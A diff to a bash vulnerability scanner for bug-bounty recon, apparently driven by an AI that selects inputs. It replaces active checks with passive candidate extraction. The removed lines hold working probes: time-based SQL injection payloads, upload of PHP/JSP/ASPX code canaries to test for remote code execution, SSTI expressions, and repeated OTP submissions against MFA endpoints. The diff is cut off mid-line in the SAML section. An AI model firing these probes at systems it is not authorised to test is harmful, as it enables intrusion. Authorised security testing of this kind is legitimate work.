@@ -1,10 +1,12 @@
 #!/bin/bash
 # =============================================================================
 # Vulnerability Scanner
-# Automated vulnerability checks against recon results
+# Candidate-first scan accounting over recon results. AI selects concrete
+# inputs; this script keeps scope/auth boundaries, bounded third-party scans,
+# passive candidate extraction, and canonical summary/index write-back.
 # Usage: ./vuln_scanner.sh <recon_dir> [--quick] [--full] [--skip module1,module2]
-# Reflected XSS uses a bounded inert marker. Stored/executable validation remains
-# owned by browser/validation runners.
+# No fixed payload or virtual endpoint sweep is performed for SQLi, XSS, SSTI,
+# upload, MFA, or SAML. Validation remains owned by AI-selected generic tools.
 #
 # Coverage matrix feedback:
 #   On completion this script writes findings/<target>/scanner_pass.json,
@@ -288,12 +290,8 @@ scanner_probe_guard() {
 }
 
 mkdir -p "$FINDINGS_DIR"/{upload,xss,sqli,takeover,misconfig,exposure,ssrf,cves,redirects,idor,auth_bypass,ssti,mfa,saml,manual_review,.tmp}
-UPLOAD_CLEANUP_FILE="$FINDINGS_DIR/manual_review/upload_cleanup.txt"
-: > "$FINDINGS_DIR/mfa/findings.txt"
 MFA_REVIEW_FILE="$FINDINGS_DIR/manual_review/mfa_review.txt"
 : > "$MFA_REVIEW_FILE"
-SAML_REVIEW_FILE="$FINDINGS_DIR/manual_review/saml_signature_review.txt"
-: > "$SAML_REVIEW_FILE"
 NUCLEI_FAILURE_MARKER="$FINDINGS_DIR/.tmp/nuclei_failed"
 SCANNER_PARTIAL_MARKER="$FINDINGS_DIR/.tmp/scanner_partial"
 
@@ -352,10 +350,13 @@ rm -f \
     "$NUCLEI_FAILURE_MARKER" \
     "$SCANNER_PARTIAL_MARKER"
 : > "$FINDINGS_DIR/manual_review/unsafe_skipped.txt"
-: > "$UPLOAD_CLEANUP_FILE"
 : > "$FINDINGS_DIR/manual_review/open_200_api.txt"
 : > "$FINDINGS_DIR/manual_review/standard_public_metadata.txt"
 : > "$FINDINGS_DIR/manual_review/external_chain_context.txt"
+rm -f \
+    "$FINDINGS_DIR/mfa/findings.txt" \
+    "$FINDINGS_DIR/saml/findings.txt" \
+    "$FINDINGS_DIR/saml/certs.txt"
 
 echo "============================================="
 echo "  Vulnerability Scanner — $TARGET"
@@ -392,6 +393,12 @@ write_summary_json() {
         "$NUCLEI_TARGETS" "$NUCLEI_TARGET_LIMIT" \
         "$NUCLEI_CVE_ENABLED" "$NUCLEI_CVE_STATUS" "$PARAM_URLS" \
         "$API_ENDPOINTS_FILTERED" "$RECON_DIR/params/interesting_params.txt" \
+        "$FINDINGS_DIR/upload/upload_candidates.txt" \
+        "$FINDINGS_DIR/sqli/timebased_candidates.txt" \
+        "$FINDINGS_DIR/xss/reflected_marker_candidates.txt" \
+        "$FINDINGS_DIR/ssti/ssti_candidates.txt" \
+        "$FINDINGS_DIR/manual_review/mfa_review.txt" \
+        "$FINDINGS_DIR/saml/endpoints.txt" \
         "$output_path" <<'PY'
 import json
 import gzip
@@ -403,7 +410,8 @@ from pathlib import Path
     target, session_id, scan_mode, recon_dir, findings_dir, skip_checks,
     live_count, ordered_scan, nuclei_targets_all, nuclei_targets,
     nuclei_target_limit, nuclei_cve_enabled, nuclei_cve_status, param_urls,
-    api_endpoints, interesting_params, output_path,
+    api_endpoints, interesting_params, upload_candidates, sqli_candidates,
+    xss_candidates, ssti_candidates, mfa_candidates, saml_candidates, output_path,
 ) = sys.argv[1:]
 findings_root = Path(findings_dir)
 recon_root = Path(recon_dir)
@@ -413,6 +421,12 @@ nuclei_targets_path = Path(nuclei_targets)
 param_urls_path = Path(param_urls)
 api_endpoints_path = Path(api_endpoints)
 interesting_params_path = Path(interesting_params)
+upload_candidates_path = Path(upload_candidates)
+sqli_candidates_path = Path(sqli_candidates)
+xss_candidates_path = Path(xss_candidates)
+ssti_candidates_path = Path(ssti_candidates)
+mfa_candidates_path = Path(mfa_candidates)
+saml_candidates_path = Path(saml_candidates)
 
 categories = [
     "upload",
@@ -550,33 +564,47 @@ def lane(
 parameter_total = count_lines(param_urls_path)
 api_total = count_lines(api_endpoints_path)
 interesting_total = count_lines(interesting_params_path)
+upload_candidate_total = count_lines(upload_candidates_path)
+sqli_candidate_total = count_lines(sqli_candidates_path)
+xss_candidate_total = count_lines(xss_candidates_path)
+ssti_candidate_total = count_lines(ssti_candidates_path)
+mfa_candidate_total = count_lines(mfa_candidates_path)
+saml_candidate_total = count_lines(saml_candidates_path)
 nuclei_total = count_lines(nuclei_targets_all_path)
 nuclei_selected = count_lines(nuclei_targets_path)
 cve_completed = nuclei_selected if nuclei_cve_status == "complete" else 0
 lane_coverage = {
     "xss_reflection": lane(
         "xss_reflection",
-        input_total=parameter_total,
-        limits=(5, 10, 20),
-        execution_kind="active_marker",
+        input_total=xss_candidate_total,
+        limits=None,
+        execution_kind="candidate_only",
         skipped=skip_all or "xss" in skip_set,
-        continuation="run the next bounded reflected-XSS marker sample",
+        continuation="select an output-context request and validate it with browser or a canonical runner",
     ),
     "sqli": lane(
         "sqli",
-        input_total=parameter_total,
-        limits=(5, 10, 20),
-        execution_kind="active_probe",
+        input_total=sqli_candidate_total,
+        limits=None,
+        execution_kind="candidate_only",
         skipped=skip_all or "sqli" in skip_set,
-        continuation="run the next bounded SQLi sample",
+        continuation="select a query-context request and validate it with a canonical runner",
     ),
     "ssti": lane(
         "ssti",
-        input_total=parameter_total,
-        limits=(20, 50, 100),
-        execution_kind="active_probe",
+        input_total=ssti_candidate_total,
+        limits=None,
+        execution_kind="candidate_only",
         skipped=skip_all or "ssti" in skip_set,
-        continuation="run the next bounded SSTI sample",
+        continuation="select a render-context request and validate it with a canonical runner",
+    ),
+    "upload_candidates": lane(
+        "upload_candidates",
+        input_total=upload_candidate_total,
+        limits=None,
+        execution_kind="candidate_only",
+        skipped=skip_all or "upload" in skip_set,
+        continuation="select an upload or file-processing request and validate it with browser/raw sender",
     ),
     "nuclei_default": lane(
         "nuclei_default",
@@ -621,6 +649,22 @@ lane_coverage = {
         skipped=skip_all or "idor" in skip_set,
         continuation="validate IDOR candidates with owner/peer actor replay",
     ),
+    "mfa_candidates": lane(
+        "mfa_candidates",
+        input_total=mfa_candidate_total,
+        limits=None,
+        execution_kind="candidate_only",
+        skipped=skip_all or "mfa" in skip_set,
+        continuation="select a real MFA/auth workflow and validate pre/post-auth state",
+    ),
+    "saml_candidates": lane(
+        "saml_candidates",
+        input_total=saml_candidate_total,
+        limits=None,
+        execution_kind="candidate_only",
+        skipped=skip_all or "saml" in skip_set,
+        continuation="select an observed SAML/SSO flow and validate it with the generic workflow/browser path",
+    ),
 }
 
 summary = {
@@ -655,10 +699,10 @@ summary = {
         "findings": total_findings,
         "manual_review_items": manual_review_items,
         "high_value": {
-            "verified_sqli_pocs": count_matching_lines(findings_root / "sqli" / "timebased_candidates.txt", "SQLI-POC-VERIFIED"),
-            "verified_rce_pocs": count_lines(findings_root / "upload" / "verified_rce_pocs.txt"),
-            "verified_upload_pocs": count_lines(findings_root / "upload" / "verified_upload_pocs.txt"),
-            "ssti_confirmed": count_matching_lines(findings_root / "ssti" / "ssti_candidates.txt", "SSTI-CONFIRMED"),
+            "verified_sqli_pocs": 0,
+            "verified_rce_pocs": 0,
+            "verified_upload_pocs": 0,
+            "ssti_confirmed": 0,
             "mfa_findings": count_lines(findings_root / "mfa" / "findings.txt"),
             "saml_findings": count_lines(findings_root / "saml" / "findings.txt"),
         },
@@ -875,171 +919,34 @@ print(time.monotonic_ns() // 1_000_000)
 PY
 }
 
-replace_param_value() {
-    local url="$1"
-    local index="$2"
-    local payload="$3"
+collect_candidate_urls() {
+    local output="$1"
+    local lane="$2"
+    local pattern="$3"
+    local raw="$FINDINGS_DIR/.tmp/${lane}.raw.txt"
+    local source
 
-    python3 - "$url" "$index" "$payload" <<'PY' 2>/dev/null || printf '%s\n' "$url"
-import sys
-from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
-
-url = sys.argv[1]
-index = int(sys.argv[2])
-payload = sys.argv[3]
-parts = urlsplit(url)
-pairs = parse_qsl(parts.query, keep_blank_values=True)
-
-if not pairs or index < 1 or index > len(pairs):
-    print(url)
-    raise SystemExit
-
-key, _value = pairs[index - 1]
-pairs[index - 1] = (key, payload)
-print(urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(pairs), parts.fragment)))
-PY
-}
-
-replace_all_param_values() {
-    local url="$1"
-    local payload="$2"
-
-    python3 - "$url" "$payload" <<'PY' 2>/dev/null || printf '%s\n' "$url"
-import sys
-from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
-
-url = sys.argv[1]
-payload = sys.argv[2]
-parts = urlsplit(url)
-pairs = parse_qsl(parts.query, keep_blank_values=True)
-
-if not pairs:
-    print(url)
-    raise SystemExit
-
-print(urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode([(k, payload) for k, _ in pairs]), parts.fragment)))
-PY
-}
-
-verify_sqli_poc() {
-    local url="$1"
-    local param_index="$2"
-    local dialect="$3"
-    local payload_1 payload_2 url_1 url_2 t0_start t0 t1_start t1 t2_start t2 d1 d2
-
-    log_step "  [VERIFY] Linear scaling check on param #$param_index ($dialect)..."
-
-    t0_start=$(now_ms)
-    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 20 "$url" >/dev/null 2>&1 || true
-    t0=$(( $(now_ms) - t0_start ))
-
-    payload_1="' AND SLEEP(1)-- "
-    payload_2="' AND SLEEP(2)-- "
-    if [ "$dialect" = "postgres" ]; then
-        payload_1="'||pg_sleep(1)-- "
-        payload_2="'||pg_sleep(2)-- "
-    fi
-
-    url_1=$(replace_param_value "$url" "$param_index" "$payload_1")
-    t1_start=$(now_ms)
-    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 25 "$url_1" >/dev/null 2>&1 || true
-    t1=$(( $(now_ms) - t1_start ))
-
-    url_2=$(replace_param_value "$url" "$param_index" "$payload_2")
-    t2_start=$(now_ms)
-    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 30 "$url_2" >/dev/null 2>&1 || true
-    t2=$(( $(now_ms) - t2_start ))
-
-    d1=$(( t1 - t0 ))
-    d2=$(( t2 - t1 ))
-
-    if [ "$d1" -gt 800 ] && [ "$d2" -gt 800 ]; then
-        log_crit "  [POC-CONFIRMED] Linear scaling: T0=${t0}ms T1=${t1}ms T2=${t2}ms"
-        return 0
-    fi
-
-    return 1
-}
-
-verify_upload_poc() {
-    local upload_url="$1"
-    local base_url ts headers ext payload canary canary_path param dir probe_url resp
-    local observed_url observed_kind cleanup_reason
-
-    if ! scanner_probe_guard "upload canary probe" "1" "$upload_url" "POST"; then
-        return 1
-    fi
-
-    base_url=$(printf '%s\n' "$upload_url" | cut -d'/' -f1-3)
-    ts=$(date +%s)
-    headers=$(curl -sk "${BB_AUTH_ARGS[@]}" -I --max-time 5 "$upload_url" 2>/dev/null || true)
-    ext="php"
-    payload='<?php echo "RCE-VAL-".(7*7); ?>'
-
-    if printf '%s\n' "$headers" | grep -qi "jsp\|java\|tomcat"; then
-        ext="jsp"
-        payload='<% out.print("RCE-VAL-" + (7*7)); %>'
-    fi
-
-    if printf '%s\n' "$headers" | grep -qi "asp\|aspx\|\\.net"; then
-        ext="aspx"
-        payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'
-    fi
-
-    canary="proof_${ts}_$$.${ext}"
-    canary_path="${TMPDIR:-/tmp}/$canary"
-    printf '%s\n' "$payload" > "$canary_path"
-
-    log_step "  [VERIFY] Attempting upload canary (${ext}): $upload_url..."
-
-    for param in file upload FileData userfile image; do
-        curl -sk "${BB_AUTH_ARGS[@]}" -F "${param}=@${canary_path}" --max-time 10 "$upload_url" >/dev/null 2>&1 || true
-        observed_url=""
-        observed_kind="unobserved"
-
-        for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
-            probe_url="${base_url}${dir}${canary}"
-            resp=$(curl -sk "${BB_AUTH_ARGS[@]}" -f --max-time 5 "$probe_url" 2>/dev/null || true)
-
-            if printf '%s\n' "$resp" | grep -q "RCE-VAL-49"; then
-                log_crit "  [POC-RCE-CONFIRMED] Code execution verified: $probe_url"
-                echo "[RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
-                observed_url="$probe_url"
-                observed_kind="executed"
-                break
-            fi
-
-            if printf '%s\n' "$resp" | grep -q "RCE-VAL-"; then
-                log_vuln "  [POC-UPLOAD-ONLY] File saved but not executed: $probe_url"
-                echo "[UPLOAD-ONLY-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_upload_pocs.txt"
-                observed_url="$probe_url"
-                observed_kind="stored"
-            fi
-        done
-
-        if [ -n "$observed_url" ]; then
-            cleanup_reason="no verified remote delete contract"
-        else
-            observed_url="unknown"
-            cleanup_reason="remote object path was not observed"
-        fi
-        printf '%s\tstatus=cleanup_unverified\tendpoint=%s\tfield=%s\tfilename=%s\tobserved=%s\tkind=%s\treason=%s\n' \
-            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
-            "$upload_url" \
-            "$param" \
-            "$canary" \
-            "$observed_url" \
-            "$observed_kind" \
-            "$cleanup_reason" >> "$UPLOAD_CLEANUP_FILE"
-
-        if [ "$observed_kind" = "executed" ]; then
-            rm -f "$canary_path"
-            return 0
-        fi
+    : > "$raw"
+    shift 3
+    for source in "$@"; do
+        [ -s "$source" ] || continue
+        awk -v pattern="$pattern" '
+            tolower($0) ~ pattern {
+                for (field = 1; field <= NF; field++) {
+                    if ($field ~ /^https?:\/\//) {
+                        print $field
+                        break
+                    }
+                }
+            }
+        ' "$source" >> "$raw"
     done
 
-    rm -f "$canary_path"
-    return 1
+    sort -u "$raw" -o "$raw" 2>/dev/null || true
+    filter_direct_finding_urls_copy \
+        "$raw" "$output" "$EXTERNAL_CHAIN_CONTEXT" "$lane"
+    sort -u "$output" -o "$output" 2>/dev/null || true
+    rm -f "$raw"
 }
 
 # Collect live URLs for scanning
@@ -1200,175 +1107,82 @@ if [ "$NUCLEI_CVE_ENABLED" = "1" ]; then
 fi
 
 # ============================================================
-# Check 0: Upload Surface Discovery
+# Check 0: Upload surface candidates
 # ============================================================
 echo ""
 if ! skip_has upload; then
-    log_info "Check 0: Upload Surface Discovery"
-
-    UPLOAD_HOST_LIMIT=$(scan_limit 10 30 60)
-    CATCHALL_HOSTS="$FINDINGS_DIR/.tmp/catchall_hosts.txt"
-    : > "$CATCHALL_HOSTS"
-
-    log_step "Detecting catchall behavior..."
-    while IFS= read -r host; do
-        [ -z "$host" ] && continue
-        CATCH_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 10 "${host%/}/non_existent_${RANDOM}_$(date +%s)" 2>/dev/null || echo "000")
-        if [ "$CATCH_CODE" = "200" ]; then
-            log_warn "Catchall detected: $host"
-            echo "$host" >> "$CATCHALL_HOSTS"
-        fi
-    done < <(head -10 "$ORDERED_SCAN")
-
-    PROBE_PATHS=(
-        "/upload.php"
-        "/uploader.php"
-        "/upload/index.php"
-        "/filemanager/index.php"
-        "/ckfinder/core/connector/php/connector.php"
-        "/fckeditor/editor/filemanager/connectors/php/connector.php"
-        "/elfinder.php"
-        "/admin/upload"
-    )
-
-    while IFS= read -r host; do
-        [ -z "$host" ] && continue
-        grep -Fxq "$host" "$CATCHALL_HOSTS" 2>/dev/null && continue
-
-        for path in "${PROBE_PATHS[@]}"; do
-            UPLOAD_URL="${host%/}${path}"
-            UPLOAD_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$UPLOAD_URL" 2>/dev/null || echo "000")
-            if [ "$UPLOAD_CODE" = "200" ]; then
-                log_vuln "Found upload path: $UPLOAD_URL"
-                echo "[UPLOAD-CANDIDATE] $UPLOAD_URL" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
-                verify_upload_poc "$UPLOAD_URL" || true
-            fi
-        done
-    done < <(head -"$UPLOAD_HOST_LIMIT" "$ORDERED_SCAN")
+    log_info "Check 0: Upload surface candidates (AI-selected validation)"
+    collect_candidate_urls \
+        "$FINDINGS_DIR/upload/upload_candidates.txt" \
+        "upload_candidates" \
+        'upload|multipart|attachment|filename|avatar|media|document|import' \
+        "$PARAM_URLS" "$PARAM_URLS_RAW" "$API_ENDPOINTS_FILTERED" "$SENSITIVE_PATHS_FILTERED" "$ALL_URLS"
+    UPLOAD_COUNT=$(count_findings "$FINDINGS_DIR/upload/upload_candidates.txt")
+    [ "$UPLOAD_COUNT" -gt 0 ] \
+        && log_warn "Upload review candidates: $UPLOAD_COUNT (AI/browser validation required)" \
+        || log_done "Upload candidates: none found"
 else
+    rm -f "$FINDINGS_DIR/upload/upload_candidates.txt"
     log_warn "Skipping upload checks (--skip)"
 fi
 
 # ============================================================
-# Check 0.5: SQL Injection
+# Check 0.5: SQL injection candidates
 # ============================================================
 echo ""
 if ! skip_has sqli; then
-    log_info "Check 0.5: SQL Injection"
-
-    if [ -s "$PARAM_URLS" ]; then
-        SQLI_LIMIT=$(scan_limit 5 10 20)
-        log_step "Advanced SQLi verification on top $SQLI_LIMIT parameterized URLs..."
-
-        while IFS= read -r url; do
-            [ -z "$url" ] && continue
-            BASE_START=$(now_ms)
-            curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 10 "$url" >/dev/null 2>&1 || true
-            BASE_MS=$(( $(now_ms) - BASE_START ))
-            PARAM_COUNT=$(printf '%s\n' "$url" | awk -F= '{print NF-1}')
-            [ "$PARAM_COUNT" -eq 0 ] && continue
-
-            for PARAM_INDEX in $(seq 1 "$PARAM_COUNT"); do
-                for DIALECT in mysql postgres; do
-                    SQLI_PAYLOAD="' AND SLEEP(2)-- "
-                    [ "$DIALECT" = "postgres" ] && SQLI_PAYLOAD="'||pg_sleep(2)-- "
-                    SQLI_URL=$(replace_param_value "$url" "$PARAM_INDEX" "$SQLI_PAYLOAD")
-                    SQLI_START=$(now_ms)
-                    SQLI_RC=0
-                    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 20 "$SQLI_URL" >/dev/null 2>&1 || SQLI_RC=$?
-                    SQLI_MS=$(( $(now_ms) - SQLI_START ))
-
-                    if [ "$SQLI_RC" -eq 0 ] && [ "$((SQLI_MS - BASE_MS))" -gt 1800 ]; then
-                        if verify_sqli_poc "$url" "$PARAM_INDEX" "$DIALECT"; then
-                            log_crit "EMPIRICAL SQLI POC: $url"
-                            echo "[SQLI-POC-VERIFIED] dialect=$DIALECT param=$PARAM_INDEX url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
-                            break 2
-                        fi
-
-                        log_vuln "SQLi candidate (delay observed but not linear): $url"
-                        echo "[SQLI-CANDIDATE] dialect=$DIALECT param=$PARAM_INDEX url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
-                    elif [ "$SQLI_RC" -eq 28 ] && [ "$SQLI_MS" -gt 18000 ]; then
-                        log_warn "Potential SQLi timeout multiplier: $url"
-                        echo "[SQLI-TIMEOUT-CANDIDATE] timeout=${SQLI_MS}ms param=$PARAM_INDEX url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
-                    fi
-                done
-            done
-        done < <(head -"$SQLI_LIMIT" "$PARAM_URLS")
-    fi
+    log_info "Check 0.5: SQLi candidates (AI-selected validation)"
+    collect_candidate_urls \
+        "$FINDINGS_DIR/sqli/timebased_candidates.txt" \
+        "sqli_candidates" \
+        '(^|[?&/])(q|query|search|filter|sort|order|where|id|ref|report|export)([=/]|$)|/api/|search|query|filter|sort|order|report|export' \
+        "$PARAM_URLS" "$PARAM_URLS_RAW" "$API_ENDPOINTS_FILTERED"
+    SQLI_COUNT=$(count_findings "$FINDINGS_DIR/sqli/timebased_candidates.txt")
+    [ "$SQLI_COUNT" -gt 0 ] \
+        && log_warn "SQLi review candidates: $SQLI_COUNT (AI-selected request required)" \
+        || log_done "SQLi candidates: none found"
 else
+    rm -f "$FINDINGS_DIR/sqli/timebased_candidates.txt"
     log_warn "Skipping SQLi checks (--skip)"
 fi
 
 # ============================================================
-# Check 1: XSS (Cross-Site Scripting)
+# Check 1: XSS candidates
 # ============================================================
 echo ""
-if skip_has xss; then
-    log_warn "Skipping XSS checks (--skip)"
+if ! skip_has xss; then
+    log_info "Check 1: XSS candidates (AI/browser-selected validation)"
+    collect_candidate_urls \
+        "$FINDINGS_DIR/xss/reflected_marker_candidates.txt" \
+        "xss_candidates" \
+        '[?&]' \
+        "$PARAM_URLS" "$PARAM_URLS_RAW"
+    XSS_COUNT=$(count_findings "$FINDINGS_DIR/xss/reflected_marker_candidates.txt")
+    [ "$XSS_COUNT" -gt 0 ] \
+        && log_warn "XSS review candidates: $XSS_COUNT (browser/validation required)" \
+        || log_done "XSS candidates: none found"
 else
-    log_info "Check 1: Reflected XSS marker sampling"
-    XSS_OUT="$FINDINGS_DIR/xss/reflected_marker_candidates.txt"
-    : > "$XSS_OUT"
-    if [ -s "$PARAM_URLS" ]; then
-        XSS_LIMIT=$(scan_limit 5 10 20)
-        XSS_MARKER="bbxss_${SESSION_ID:-scan}_marker"
-        while IFS= read -r url; do
-            [ -n "$url" ] || continue
-            XSS_URL=$(replace_all_param_values "$url" "$XSS_MARKER")
-            XSS_BODY=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 10 "$XSS_URL" 2>/dev/null || true)
-            if printf '%s' "$XSS_BODY" | grep -Fq "$XSS_MARKER"; then
-                printf '[XSS-REFLECTION-SIGNAL] marker=%s url=%s\n' \
-                    "$XSS_MARKER" "$XSS_URL" >> "$XSS_OUT"
-            fi
-        done < <(head -"$XSS_LIMIT" "$PARAM_URLS")
-        XSS_COUNT=$(count_findings "$XSS_OUT")
-        [ "$XSS_COUNT" -gt 0 ] \
-            && log_warn "Reflected XSS marker signals: $XSS_COUNT (browser validation required)" \
-            || log_done "Reflected XSS marker: no sampled reflection"
-    else
-        log_done "Reflected XSS marker: no parameterized URLs"
-    fi
+    rm -f "$FINDINGS_DIR/xss/reflected_marker_candidates.txt"
+    log_warn "Skipping XSS checks (--skip)"
 fi
 
 # ============================================================
-# Check 1.5: SSTI (Server-Side Template Injection)
+# Check 1.5: SSTI candidates
 # ============================================================
 echo ""
 if ! skip_has ssti; then
-    log_info "Check 1.5: SSTI Detection"
-    SSTI_OUT="$FINDINGS_DIR/ssti/ssti_candidates.txt"
-
-    if [ -s "$PARAM_URLS" ]; then
-        SSTI_LIMIT=$(scan_limit 20 50 100)
-        SSTI_ENGINES=("jinja2" "freemarker" "thymeleaf" "erb")
-        SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "*{7*7}" "<%= 7*7 %>")
-        SSTI_HITS=0
-
-        log_step "Testing SSTI payloads on up to $SSTI_LIMIT URLs..."
-
-        while IFS= read -r url; do
-            [ -z "$url" ] && continue
-
-            for idx in "${!SSTI_ENGINES[@]}"; do
-                ENGINE="${SSTI_ENGINES[$idx]}"
-                PAYLOAD="${SSTI_PAYLOADS[$idx]}"
-                INJECTED_URL=$(replace_all_param_values "$url" "$PAYLOAD")
-                BODY=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 10 "$INJECTED_URL" 2>/dev/null || true)
-
-                if printf '%s\n' "$BODY" | grep -qE '(\b49\b|7777777)'; then
-                    log_crit "SSTI confirmed [$ENGINE]: $INJECTED_URL"
-                    echo "[SSTI-CONFIRMED] engine=$ENGINE url=$INJECTED_URL" >> "$SSTI_OUT"
-                    SSTI_HITS=$((SSTI_HITS + 1))
-                    break
-                fi
-            done
-        done < <(head -"$SSTI_LIMIT" "$PARAM_URLS")
-
-        [ "$SSTI_HITS" -eq 0 ] && log_done "SSTI: clean"
-    else
-        log_done "SSTI: no parameterized URLs"
-    fi
+    log_info "Check 1.5: SSTI candidates (AI-selected validation)"
+    collect_candidate_urls \
+        "$FINDINGS_DIR/ssti/ssti_candidates.txt" \
+        "ssti_candidates" \
+        'template|render|preview|view|format|message|content|subject|name|title|email|report|pdf' \
+        "$PARAM_URLS" "$PARAM_URLS_RAW" "$API_ENDPOINTS_FILTERED" "$SENSITIVE_PATHS_FILTERED"
+    SSTI_COUNT=$(count_findings "$FINDINGS_DIR/ssti/ssti_candidates.txt")
+    [ "$SSTI_COUNT" -gt 0 ] \
+        && log_warn "SSTI review candidates: $SSTI_COUNT (AI-selected request required)" \
+        || log_done "SSTI candidates: none found"
 else
+    rm -f "$FINDINGS_DIR/ssti/ssti_candidates.txt"
     log_warn "Skipping SSTI checks (--skip)"
 fi
 
@@ -1664,9 +1478,6 @@ fi
 if [ ! -s "$FINDINGS_DIR/manual_review/unsafe_skipped.txt" ]; then
     rm -f "$FINDINGS_DIR/manual_review/unsafe_skipped.txt"
 fi
-if [ ! -s "$UPLOAD_CLEANUP_FILE" ]; then
-    rm -f "$UPLOAD_CLEANUP_FILE"
-fi
 if [ ! -s "$FINDINGS_DIR/manual_review/open_200_api.txt" ]; then
     rm -f "$FINDINGS_DIR/manual_review/open_200_api.txt"
 fi
@@ -1678,59 +1489,23 @@ if [ ! -s "$FINDINGS_DIR/manual_review/external_chain_context.txt" ]; then
 fi
 
 # ============================================================
-# Check 9: MFA / 2FA Bypass
+# Check 9: MFA / 2FA review candidates
 # ============================================================
 echo ""
 if ! skip_has mfa; then
-    log_info "Check 9: MFA / 2FA Bypass"
-    MFA_LIMIT=$(scan_limit 10 20 40)
-    MFA_ENDPOINTS=$(grep -iE "/(mfa|otp|2fa|verify|authenticate|token|totp|sms.code|auth.code)" "$ORDERED_SCAN" 2>/dev/null | head -"$MFA_LIMIT" || true)
-
-    if [ -n "$MFA_ENDPOINTS" ]; then
-        while IFS= read -r url; do
-            [ -z "$url" ] && continue
-            BASE=$(printf '%s\n' "$url" | cut -d'?' -f1)
-            HOST=$(printf '%s\n' "$url" | grep -oE "https?://[^/]+" || true)
-
-            log_step "Rate limit probe: $BASE"
-            STATUS_RAW=$(for _i in $(seq 1 15); do
-                curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
-                    "${BB_AUTH_ARGS[@]}" \
-                    -X POST "$BASE" \
-                    -H "Content-Type: application/json" \
-                    -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
-            done)
-            STATUS_CODES=$(printf '%s\n' "$STATUS_RAW" | sort | uniq -c | sort -rn | head -5)
-
-            if printf '%s\n' "$STATUS_RAW" | grep -Eq '^[2-5][0-9][0-9]$' \
-                && ! printf '%s\n' "$STATUS_RAW" | grep -q '^429$'; then
-                log_warn "[MFA] Rate-limit observation requires pre/post-MFA control: $BASE"
-                echo "[MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES | manual pre/post-MFA control required" >> "$MFA_REVIEW_FILE"
-            fi
-            if [ -n "$HOST" ]; then
-                log_step "Workflow skip probe: $BASE"
-                for PROTECTED in dashboard home profile account settings admin; do
-                    SKIP_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$HOST/$PROTECTED" 2>/dev/null || echo "000")
-                    if [ "$SKIP_CODE" = "200" ]; then
-                        log_warn "[MFA] Protected endpoint returned 200; pre-MFA session control required: $HOST/$PROTECTED"
-                        echo "[MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200) | manual pre/post-MFA control required" >> "$MFA_REVIEW_FILE"
-                    fi
-                done
-            fi
-
-            MFA_RESP=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 5 -X POST "$BASE" \
-                -H "Content-Type: application/json" \
-                -d '{"otp":"999999"}' 2>/dev/null || true)
-
-            if printf '%s\n' "$MFA_RESP" | grep -qi '"success"[[:space:]]*:[[:space:]]*false\|"verified"[[:space:]]*:[[:space:]]*false\|"status"[[:space:]]*:[[:space:]]*"fail"'; then
-                log_warn "[MFA] Normal failure response observed; no candidate without controlled pre/post-MFA comparison: $BASE"
-                echo "[MFA-RESPONSE-MANIP] $BASE | normal failure response; manual pre/post-MFA control required" >> "$MFA_REVIEW_FILE"
-            fi
-        done <<< "$MFA_ENDPOINTS"
-    else
-        log_warn "No MFA/OTP endpoints detected in URL list"
-    fi
+    log_info "Check 9: MFA / 2FA review candidates (AI-selected validation)"
+    : > "$MFA_REVIEW_FILE"
+    collect_candidate_urls \
+        "$MFA_REVIEW_FILE" \
+        "mfa_candidates" \
+        'mfa|2fa|otp|totp|sso|authenticate|verify|challenge|recovery|step[-_ ]?up' \
+        "$PARAM_URLS" "$PARAM_URLS_RAW" "$API_ENDPOINTS_FILTERED" "$SENSITIVE_PATHS_FILTERED" "$ALL_URLS"
+    MFA_COUNT=$(count_findings "$MFA_REVIEW_FILE")
+    [ "$MFA_COUNT" -gt 0 ] \
+        && log_warn "MFA/2FA review candidates: $MFA_COUNT (controlled pre/post-auth validation required)" \
+        || log_done "MFA/2FA candidates: none found"
 else
+    rm -f "$MFA_REVIEW_FILE"
     log_warn "Skipping MFA checks (--skip)"
 fi
 
@@ -1739,120 +1514,26 @@ if [ ! -s "$MFA_REVIEW_FILE" ]; then
 fi
 
 # ============================================================
-# Check 10: SAML / SSO Attacks
+# Check 10: SAML / SSO review candidates
 # ============================================================
 echo ""
 if ! skip_has saml; then
-    log_info "Check 10: SAML / SSO Attack Surface"
-    SAML_HOST_LIMIT=$(scan_limit 10 20 50)
+    log_info "Check 10: SAML / SSO review candidates (AI-selected validation)"
     rm -f \
         "$FINDINGS_DIR/saml/findings.txt" \
-        "$FINDINGS_DIR/saml/endpoints.txt" \
         "$FINDINGS_DIR/saml/certs.txt"
-
-    while IFS= read -r host; do
-        [ -z "$host" ] && continue
-        for SAML_PATH in "/saml/login" "/sso/saml" "/auth/saml" "/api/auth/saml" \
